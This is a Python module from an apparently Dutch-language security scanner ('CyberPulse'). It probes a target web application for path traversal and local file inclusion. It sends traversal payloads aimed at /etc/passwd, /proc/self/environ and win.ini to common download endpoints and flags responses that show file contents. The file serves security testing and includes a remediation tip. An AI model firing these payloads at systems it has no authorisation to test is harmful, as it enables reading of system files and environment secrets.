"""M80 - Authenticated File Inclusion / Path Traversal (Gray Box)"""
import urllib.request, urllib.error, http.cookiejar, urllib.parse

class Scanner:
    def __init__(self, target, output_dir, config=None):
        self.target = target
        self.output_dir = output_dir
        self.config = config or {}
        self.creds = self.config.get("credentials", {})
        if not self.target.startswith(("http://","https://")):
            self.target_url = f"https://{self.target}"
        else:
            self.target_url = self.target
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))
        self.api_token = self.creds.get("api_token","")
        self.api_header = self.creds.get("api_header","Authorization")

    def _headers(self):
        h = {"User-Agent":"CyberPulse/4.0"}
        if self.api_token:
            h[self.api_header] = self.api_token if "Bearer" in self.api_token else f"Bearer {self.api_token}"
        return h

    def _get(self, url):
        try:
            resp = self.opener.open(urllib.request.Request(url, headers=self._headers()), timeout=8)
            return resp.status, resp.read(1024).decode("utf-8","ignore")
        except urllib.error.HTTPError as e:
            return e.code, ""
        except Exception:
            return 0, ""

    def run(self):
        findings = []
        output = [f"[M80] Path traversal / LFI test: {self.target_url}"]
        payloads = ["../../etc/passwd","../../../etc/passwd","....//....//etc/passwd",
                    "../../windows/win.ini","../../proc/self/environ"]
        endpoints = ["/download?file={p}","/file?name={p}","/static/{p}","/api/file?path={p}",
                     "/get-file?filename={p}","/export?path={p}","/files/{p}"]
        unix_ind  = ["root:x:","root:0:","nobody:","www-data:"]
        win_ind   = ["[fonts]","[extensions]"]
        for ep in endpoints:
            for pl in payloads[:4]:
                url = self.target_url + ep.replace("{p}", urllib.parse.quote(pl,safe="./"))
                status, body = self._get(url)
                output.append(f"  [{status}] {ep.split('?')[0]} payload={pl[:25]}")
                if status == 200 and any(i in body for i in unix_ind+win_ind):
                    findings.append({"title":"Local File Inclusion Bevestigd","severity":"critical",
                        "description":f"Payload '{pl}' via {ep} laat systeembestanden lezen (bijv. /etc/passwd).",
                        "recommendation":"Gebruik een bestandsnaam-whitelist. Valideer paden met os.path.realpath en controleer of het pad binnen de toegestane map valt."})
                    break
        if not findings:
            output.append("  [OK] Geen LFI/path-traversal kwetsbaarheden")
        return {"findings":findings,"raw_output":"\n".join(output)}
